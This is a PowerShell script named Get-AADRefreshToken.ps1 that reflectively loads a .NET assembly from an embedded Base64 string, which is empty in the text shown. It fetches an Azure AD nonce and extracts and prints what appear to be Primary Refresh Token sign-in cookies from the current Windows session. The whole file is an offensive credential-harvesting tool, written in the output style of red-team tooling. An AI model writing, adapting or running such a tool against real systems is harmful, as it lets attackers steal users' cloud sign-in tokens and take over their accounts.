# -----------------------------
# Get-AADRefreshToken.ps1
# -----------------------------
param()

function Get-AADRefreshToken {
    [CmdletBinding()]
    param(
        [string]$Nonce,
        [string]$Tenant = "common",
        [switch]$Legacy,
        [switch]$Help
    )

    if ($Help) {
        Write-Host "Usage:`n" -ForegroundColor Cyan
        Write-Host "  Default (auto nonce):   Get-AADRefreshToken"
        Write-Host "  Custom tenant:          Get-AADRefreshToken -Tenant <TenantId>"
        Write-Host "  Manual nonce:           Get-AADRefreshToken -Nonce <nonce>"
        Write-Host "  Legacy (no nonce):      Get-AADRefreshToken -Legacy"
        return
    }

    Write-Host "[*] PID    : $([System.Diagnostics.Process]::GetCurrentProcess().Id)"
    Write-Host "[*] Thread : $([System.AppDomain]::GetCurrentThreadId())"
    Write-Host ""

    # --- Load DLL from Base64 ---
    $encoded = @"

"@
    $bytes = [Convert]::FromBase64String($encoded)
    $asm = [Reflection.Assembly]::Load($bytes)

    # Resolve types
    $bridgeType  = $asm.GetType("TokenHelper.Internal.NativeTokenBridge")
    $nonceHelper = $asm.GetType("TokenHelper.Internal.NonceHelper")

    # --- Mode selection ---
    if ($Legacy) {
        Write-Host "[!] Legacy mode - no nonce will be embedded"
        Write-Host "[!] Cookie will use iat timestamp - likely rejected by AAD`n"
        $uris = @($bridgeType::BuildUri($null))
    }
    elseif (-not $Nonce) {
        Write-Host "[*] No nonce provided - fetching from AAD automatically"
        Write-Host "[*] Tenant : $Tenant`n"

        try {
            $Nonce = $nonceHelper::FetchNonce($Tenant)
        }
        catch {
            Write-Host "[-] Failed to fetch nonce: $_"
            return
        }

        Write-Host "[+] Nonce  : $Nonce`n"
        $uris = @($bridgeType::BuildUri($Nonce))
    }
    else {
        Write-Host "[*] Using provided nonce"
        Write-Host "[*] Nonce  : $Nonce`n"
        $uris = @($bridgeType::BuildUri($Nonce))
    }

    # --- Cookie extraction ---
    foreach ($uri in $uris) {
        Write-Host "[*] URI    : $uri`n"

        try {
            # FIX: materialize the yield IEnumerable via ToList() so PS can enumerate it
            $results = [System.Linq.Enumerable]::ToList($bridgeType::GetCookies($uri))
        }
        catch {
            Write-Host "[-] Failed to fetch cookies: $_"
            continue
        }

        # FIX: check .Count instead of -not $results (state machine object is never null)
        if ($results.Count -eq 0) {
            Write-Host "[!] No cookies returned for this URI`n"
            continue
        }

        foreach ($c in $results) {
            Write-Host "[*] Name      : $($c.Name)"
            Write-Host "[*] Flags     : $($c.Flags)"
            Write-Host "[*] Data      : $($c.Data)"
            Write-Host "[*] P3PHeader : $($c.P3PHeader)`n"
        }
    }

    Write-Host "DONE"
}